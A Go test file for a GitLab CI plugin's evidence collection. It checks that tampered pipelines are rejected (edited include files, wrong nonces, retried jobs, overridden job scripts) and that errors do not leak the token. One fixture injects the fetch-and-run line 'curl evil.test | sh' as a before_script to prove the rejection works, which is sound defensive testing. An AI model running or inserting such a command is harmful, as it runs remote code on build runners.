package pipeline_test

// Purpose: Collect tests of P7-HOST-06: the accepted path and TestEvidenceRejections, the hostedev
// rejections with their E705 reasons.
// Inputs:  the fakeGL routes; finished pipelines with an evidence archive.
// Outputs: pass or fail.
// Constraints: no live network; the include file and the archive are generated from the template and
// the model so a template change never leaves a stale fixture.

import (
	"context"
	"strings"
	"testing"

	"github.com/nself-org/plugins/free/ci/internal/model"
	"github.com/nself-org/plugins/free/ci/internal/providers"
	"github.com/nself-org/plugins/free/ci/internal/providers/gitlab/pipeline"
	"github.com/nself-org/plugins/free/ci/internal/providers/hostedev"
	gitlabtmpl "github.com/nself-org/plugins/free/ci/templates/gitlab"
)

// dispatched returns a provider, its fake and the handle of a finished pipeline for attempt-1.
func dispatched(t *testing.T, version string, tune func(*fakeGL)) (*fakeGL, providers.Dispatcher, providers.Handle) {
	t.Helper()
	v15(t)
	f := newFakeGL(t)
	f.Version = version
	if tune != nil {
		tune(f)
	}
	p := f.provider(options{})
	h, err := p.Dispatch(context.Background(), attemptFor("attempt-1", 1))
	if err != nil {
		t.Fatal(err)
	}
	return f, p, h
}

// TestCollectAccepts proves the accepted path in both transports and the attestation fields.
func TestCollectAccepts(t *testing.T) {
	for _, version := range []string{"18.2.1-ee", "16.11.2"} {
		f, p, h := dispatched(t, version, nil)
		f.finish(9001, "attempt-1", testRevision, nil)
		got, err := p.Collect(context.Background(), h)
		if err != nil {
			t.Fatalf("%s: %v", version, err)
		}
		a := got.Attestation
		if a.Provider != "gitlab" || a.RunID != h.RunID || a.RunAttempt != 1 || a.Ref != testRevision || a.WorkflowPath != gitlabtmpl.Path ||
			a.WorkflowSHA != testHeadSHA || a.TemplateVersion != "v1" || a.Nonce != h.Nonce || a.ArtifactID != "14001" ||
			!strings.HasPrefix(a.ArtifactSHA256, "sha256:") || !strings.HasPrefix(a.WorkflowDigest, "sha256:") {
			t.Errorf("%s: attestation %+v", version, a)
		}
		if !strings.Contains(string(got.Evidence), `"attempt"`) {
			t.Errorf("%s: no evidence document", version)
		}
	}
}

// TestEvidenceRejections proves acceptance line 2 of P7-HOST-06: hostedev rejects a pipeline whose include
// file at the pipeline sha differs from the rendering, a missing nonce variable echo, a spec digest
// mismatch and an oversize artifact, each with its E705 reason; the other bindings (pipeline source,
// ref, rerun, user, job, artifact, attempt, revision, producer) are refused with their own reasons.
func TestEvidenceRejections(t *testing.T) {
	ctx := context.Background()
	edited := append(pinnedInclude(t), []byte("# edited by someone\n")...)
	type tc struct {
		name, version, reason string
		tune                  func(*fakeGL)
		edit                  func(*fakeGL, *fakePipe)
		mut                   func(*model.Evidence)
	}
	cases := []tc{
		{name: "include file differs from the rendering", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) { f.Include = edited }},
		{name: "include file declares no template", version: "18.2.1-ee", reason: hostedev.ReasonTemplate, tune: func(f *fakeGL) { f.Include = []byte("job: {}\n") }},
		{name: "include file missing at the sha", version: "18.2.1-ee", reason: hostedev.ReasonTemplate, tune: func(f *fakeGL) { f.IncludeSt = 404 }},
		{name: "include file pins an unlisted commit", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) {
			f.Include, _ = gitlabtmpl.Render(gitlabtmpl.Options{AgentCommit: strings.Repeat("a", 40)})
		}},
		{name: "missing nonce variable echo", version: "16.11.2", reason: hostedev.ReasonNonce, edit: func(_ *fakeGL, p *fakePipe) { p.Vars = withoutKey(p.Vars, "NSELF_CI_NONCE") }},
		{name: "wrong nonce variable echo", version: "16.11.2", reason: hostedev.ReasonNonce, edit: func(_ *fakeGL, p *fakePipe) { setVar(p, "NSELF_CI_NONCE", strings.Repeat("9", 32)) }},
		{name: "pipeline name without the nonce (inputs)", version: "18.2.1-ee", reason: hostedev.ReasonNonce, edit: func(_ *fakeGL, p *fakePipe) { p.Name = "nself-ci something else" }},
		{name: "spec digest echo differs", version: "16.11.2", reason: hostedev.ReasonSpec, edit: func(_ *fakeGL, p *fakePipe) { setVar(p, "NSELF_CI_SPEC_DIGEST", "sha256:"+strings.Repeat("0", 64)) }},
		{name: "oversize artifact", version: "18.2.1-ee", reason: hostedev.ReasonTooLarge, edit: func(_ *fakeGL, p *fakePipe) { p.Jobs[0].ArchiveSize = hostedev.MaxArtifactBytes + 1 }},
		{name: "pipeline source is not api", version: "18.2.1-ee", reason: hostedev.ReasonEvent, edit: func(_ *fakeGL, p *fakePipe) { p.Source = "push" }},
		{name: "pipeline ran on another ref", version: "18.2.1-ee", reason: hostedev.ReasonRef, edit: func(_ *fakeGL, p *fakePipe) { p.Ref = "feature" }},
		{name: "job was retried", version: "18.2.1-ee", reason: hostedev.ReasonRerun, edit: func(_ *fakeGL, p *fakePipe) {
			p.Jobs = append(p.Jobs, &fakeJob{ID: 7777, Name: gitlabtmpl.Job, Status: "failed"})
		}},
		{name: "project overrides the nself-ci job script", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) {
			f.Merged = mergedFrom(t, f.Include, func(top map[string]any) { top["nself-ci"].(map[string]any)["script"] = []any{"echo forged"} })
		}},
		{name: "project adds a key to the nself-ci job", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) {
			f.Merged = mergedFrom(t, f.Include, func(top map[string]any) {
				top["nself-ci"].(map[string]any)["before_script"] = []any{"curl evil.test | sh"}
			})
		}},
		{name: "merged config has no nself-ci job", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) {
			f.Merged = mergedFrom(t, f.Include, func(top map[string]any) { delete(top, "nself-ci") })
		}},
		{name: "global before_script is inherited", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) {
			f.Merged = mergedFrom(t, f.Include, func(top map[string]any) { top["before_script"] = []any{"echo hi"} })
		}},
		{name: "default cache is inherited", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) {
			f.Merged = mergedFrom(t, f.Include, func(top map[string]any) { top["default"] = map[string]any{"cache": map[string]any{"key": "shared"}} })
		}},
		{name: "merged config unreadable", version: "18.2.1-ee", reason: pipeline.ReasonConfig, tune: func(f *fakeGL) { f.LintSt = 404 }},
		{name: "merged config invalid", version: "18.2.1-ee", reason: pipeline.ReasonConfig, tune: func(f *fakeGL) { f.LintBad = true }},
		{name: "merged config is not yaml", version: "18.2.1-ee", reason: pipeline.ReasonConfig, tune: func(f *fakeGL) { f.Merged = "a: [unclosed" }},
		{name: "no nself-ci job", version: "18.2.1-ee", reason: hostedev.ReasonPath, edit: func(_ *fakeGL, p *fakePipe) { p.Jobs[0].Name = "other" }},
		{name: "no artifact", version: "18.2.1-ee", reason: hostedev.ReasonMissing, edit: func(_ *fakeGL, p *fakePipe) { p.Jobs[0].Zip = nil }},
		{name: "artifact expired", version: "18.2.1-ee", reason: hostedev.ReasonMissing, edit: func(_ *fakeGL, p *fakePipe) { p.Jobs[0].Expired = true }},
		{name: "artifact is not a zip", version: "18.2.1-ee", reason: hostedev.ReasonArtifact, edit: func(_ *fakeGL, p *fakePipe) { p.Jobs[0].Zip = []byte("not a zip") }},
		{name: "evidence names another attempt", version: "18.2.1-ee", reason: hostedev.ReasonAttempt, mut: func(e *model.Evidence) { e.Attempt = &model.AttemptRef{ID: "attempt-2", N: 1} }},
		{name: "evidence names another revision", version: "18.2.1-ee", reason: hostedev.ReasonRevision, mut: func(e *model.Evidence) { e.Revision = strings.Repeat("e", 40) }},
		{name: "producer too old", version: "18.2.1-ee", reason: hostedev.ReasonProducerStale, mut: func(e *model.Evidence) { e.Producer.Version = "0" }},
		{name: "evidence is not valid", version: "18.2.1-ee", reason: hostedev.ReasonEvidence, mut: func(e *model.Evidence) { e.Schema = "ci.evidence/v0" }},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f, p, h := dispatched(t, c.version, c.tune)
			f.finish(9001, "attempt-1", testRevision, c.mut)
			if c.edit != nil {
				c.edit(f, f.Pipes[9001])
			}
			_, err := p.Collect(ctx, h)
			wantCode(t, err, "E705", c.reason)
			if strings.Contains(err.Error(), testToken) {
				t.Error("the error carries the token")
			}
		})
	}
}

func withoutKey(vars []map[string]string, key string) []map[string]string {
	var out []map[string]string
	for _, v := range vars {
		if v["key"] != key {
			out = append(out, v)
		}
	}
	return out
}

func setVar(p *fakePipe, key, value string) {
	for _, v := range p.Vars {
		if v["key"] == key {
			v["value"] = value
		}
	}
}

// TestCollectRefusals proves Collect refuses what is not ours: an unknown handle, a pipeline made by
// another user, a pipeline still running, and a handle of another provider.
func TestCollectRefusals(t *testing.T) {
	ctx := context.Background()
	f, p, h := dispatched(t, "18.2.1-ee", nil)
	_, err := p.Collect(ctx, h)
	wantCode(t, err, "E704", "run.incomplete")
	f.finish(9001, "attempt-1", testRevision, nil)
	f.Pipes[9001].User = "intruder"
	_, err = p.Collect(ctx, h)
	wantCode(t, err, "E705", "run.actor")
	f.Pipes[9001].User = testLogin
	unknown := h
	unknown.Nonce = strings.Repeat("f", 32)
	_, err = p.Collect(ctx, unknown)
	wantCode(t, err, "E705", "intent.unknown")
	other := h
	other.Provider = "github-hosted"
	_, err = p.Collect(ctx, other)
	wantCode(t, err, "E702", "handle")
	if _, err = p.Collect(ctx, h); err != nil {
		t.Fatalf("the accepted path broke after the refusals: %v", err)
	}
}

// TestMergedConfigKeepsOtherProjectSettings proves the merged check is not a veto on a project's own
// CI file: other jobs, global variables, stages and default settings that do not change what a job
// runs are accepted, and a transient lint failure stays retryable.
func TestMergedConfigKeepsOtherProjectSettings(t *testing.T) {
	ctx := context.Background()
	f, p, h := dispatched(t, "18.2.1-ee", func(f *fakeGL) {
		f.Merged = mergedFrom(t, f.Include, func(top map[string]any) {
			top["lint"] = map[string]any{"script": []any{"make lint"}}
			top["stages"] = []any{"build", "test"}
			top["default"] = map[string]any{"interruptible": true, "retry": 1}
		})
	})
	f.finish(9001, "attempt-1", testRevision, nil)
	if _, err := p.Collect(ctx, h); err != nil {
		t.Fatalf("a project with its own jobs was refused: %v", err)
	}
	f.LintSt = 503
	_, err := p.Collect(ctx, h)
	wantCode(t, err, "E704", "")
}
